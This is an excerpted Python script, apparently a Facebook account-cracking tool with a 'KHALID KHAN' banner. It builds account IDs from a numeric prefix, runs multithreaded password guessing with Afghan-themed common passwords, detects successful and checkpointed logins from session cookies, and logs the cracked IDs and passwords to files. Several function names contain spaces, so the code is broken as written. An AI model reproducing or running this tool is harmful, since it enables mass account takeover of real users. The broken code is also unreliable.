...
os.system('xdg-open https://facebook.com/groups/129218606793658/')
...
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        ...
        os.system('python KHALID KHAN.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
...
try:
        ...
        os.system('pip install futures==2 && python KHALID KHAN.py')
...
\033[1;32m+=========================================================+
|   OWNER             :   KHALID KHAN
|   FACEBOOK        :   KHALID KHAN
|   TELEGRAM     :  @KHALID KHAN
|   TOOLS                :     Free
|   VERSIN               :     7.5
+=========================================================+""")
os.system('xdg-open https://youtube.com/@superstarclip')
def linex():
        print('\033[1;32m----------------------------------------------')
def clear():
        os.system('clear')
...
def KHALID KHAN1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        KHALID KHAN=session.cookies.get_dict().keys()
                        if "c_user" in KHALID KHAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [KHALID KHAN-OK] %s • %s'%(ids,pas))
                                open('/sdcard/KHALID KHAN-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in KHALID KHAN:
                                if 'y' in pcp:
                                        print#('\r\r\x1b[38;5;208m [KHALID KHAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KHALID KHAN-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                time.sleep(20)
        loop+=1
def KHALID KHAN2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [KHALID KHAN-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def rdm():
	...
	print('[0] Exit menu')
	linex()
	KHALID KHAN=input(' Select Option :')
	if KHALID KHAN =='1':
		KHALID KHANs()
	if KHALID KHAN =='0':
		exit(' Thanks for use 👌😜 ')
...
def KHALID KHANst():
    ...
    os.system('clear')
    print(logo)
    print(' Code example: 9378 9376 9379 9370 9374 9377 9373 \033[0;92m')
    linex()
    kode = input(' Put Code : ')
    os.system('clear')
    print(logo)
    limit = int(input(' Example : 2000,3000,5000,20000,50000 put limit:\n\33[1;32m----------------------------------------------\n put Limit : '))
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx = [guru,'afghan123','afghan1234','afghan12345','١٢٣٤٥٦','500500','200300','800900','90009000','afghanistan','900900','10002000','khanafghan','afghan1122','khankhan','600700','khan123','kabul123','khan12345','kabul12345','kabul1234','khan1234','١٢٣٤٥٦٧٨٩']
            yaari.submit(rcrack,uid,pwx,tl)
    linex()
    print(' Crack process has been completed')
    print(' Ids saved in KHALID KHAN-OK.txt,in cp KHALID KHAN-CP.txt')
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KHALID KHAN-OK] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/KHALID KHAN-OK.txt', 'a').write(cid+' • '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[KHALID KHAN-CP] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/KHALID KHAN-CP.txt', 'a').write(cid+' • '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[KHALID KHAN] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def KHALID KHAN():
        try:
                ...
                if x == ("KHALID KHAN"):
                        ...
                        if xd in ['3','03']:
                        	os.system('xdg-open https://www.facebook.com/profile.php?id=100000057577697');menu()
                        if xd in ['2','02']:
                        	rdm()
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        for user in fo:
                                                ...
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(KHALID KHAN1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(KHALID KHAN2,ids,names,passlist)
                                                else:
